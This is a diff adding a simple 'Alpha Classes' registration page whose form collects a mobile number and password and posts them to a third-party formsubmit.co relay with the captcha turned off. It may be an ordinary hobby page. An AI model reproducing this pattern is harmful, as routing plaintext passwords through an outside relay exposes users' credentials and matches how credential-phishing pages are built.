@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Alpha Classes - Register</title>
+  <style>
+    body {
+      background-color: #0e1628;
+      color: white;
+      font-family: sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    h1 {
+      font-size: 2rem;
+      color: #00bcd4;
+    }
+    form {
+      background-color: #1c273a;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px #00bcd4;
+      display: flex;
+      flex-direction: column;
+      width: 300px;
+    }
+    input, button {
+      margin-bottom: 15px;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+    }
+    button {
+      background-color: #00bcd4;
+      color: white;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h1>Alpha Classes</h1>
+  <form action="https://formsubmit.co/el/yafefu" method="POST">
+    <input type="text" name="Mobile Number" placeholder="Enter mobile number" required>
+    <input type="password" name="Password" placeholder="Enter password" required>
+    <input type="hidden" name="_next" value="https://nrdevlopers.github.io/alpha-classes/thankyou.html">
+    <input type="hidden" name="_captcha" value="false">
+    <button type="submit">Register</button>
+  </form>
+</body>
+</html>
